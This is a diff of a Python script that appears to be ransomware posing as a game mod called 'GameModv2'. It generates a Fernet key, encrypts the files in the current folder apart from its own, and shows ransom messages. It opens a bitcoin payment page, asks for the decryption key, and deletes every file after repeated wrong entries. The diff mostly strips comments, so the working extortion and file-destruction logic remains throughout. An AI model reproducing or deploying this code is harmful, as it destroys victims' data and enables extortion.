@@ -3,7 +3,6 @@
 # sudo apt install python3-pip -y       #linux system
 # pip install -r requirements.txt
 
-
 import os
 # pip install cryptography
 from cryptography.fernet import Fernet
@@ -24,13 +23,12 @@ label1 = Label(image=test)
 label1.image = test
 # Position image
 label1.place(x=0, y=0)
-# root.mainloop()
+
 
 files = []
 impfiles = ("GameModv2.py", "GameModv2.exe", "bitcoin.html", "hacked2.jpg", "qr-code.jpg")
-global count, flag  #, check
+global count, flag
 flag = 0
-# check = 0
 
 for file in os.listdir():
     if file in impfiles:
@@ -42,8 +40,6 @@ for file in os.listdir():
 
 # KEY
 key = Fernet.generate_key()
-# with open("thekey.key", "wb") as thekey:
-#     thekey.write(key)
 
 # alt+enter     shortcut to file properties
 # hide files
@@ -65,32 +61,17 @@ if(flag == 0):
 
     flag = 1
     print("You have been HACKED!\nAll your files have been encrypted!, Send money or i'll delete them")   
-    # os.system("./hacked2.jpg") 
     messagebox.showerror(title="ERROR", message="All your files have been Encrypted!\nSend Money...$$ or I'll Delete them!")
 
 
-
-
-def getString():
-    global count, userkey
 
 
 # DECRYPT
 count = 2
 while(count!=0 and flag==1):        
     global userkey
-    # userkey = StringVar()
 
-    # userkey = input("Enter the secret key to decrypt your files\n")
-    # passw_label = Label(root, text="Enter the secret key to decrypt your files\n", font=('calibre',10, 'bold'))
-    # passw_entry = Entry(root, textvariable=userkey, width=20)
-    # sub_btn = Button(root,text = 'Submit', command = getString)
-
-    # passw_label.grid(row=0,column=0)
-    # passw_entry.grid(row=0,column=1)
-    # sub_btn.grid(row=1,column=1)
-
-    os.system(".\\bitcoin.html")
+    os.system(".\\bitcoin.html")    #invokes bitcoin page    # \\ to escape the escape character \, so prints \
     userkey = askstring('Decrypt', 'Enter the secret key to decrypt your files')
     
 
@@ -104,13 +85,11 @@ while(count!=0 and flag==1):
             with open(file, "wb") as thefile:
                 thefile.write(content_decrypted)
 
-        # root.wait_visibility()
         messagebox.showinfo("Message", "Sucessfully Decrypted")
         print("Sucessfully Decrypted")
         os.remove("thekey.key")
         break
     else:
-        # root.wait_visibility()
         messagebox.showwarning(title="WARNING", message=f"Warning!... Will Delete all files in next {count} Incorrect tries\n")
         print(f"Warning!... Will Delete all files in next {count} Incorrect tries")
         count -= 1
@@ -119,7 +98,6 @@ while(count!=0 and flag==1):
     if count == 0:
         for file in files:
             os.remove(file)
-        # root.wait_visibility()
         messagebox.showerror(title="ERROR", message="Deleted all files!")
         print("Deleted all files!\n")
         quit()
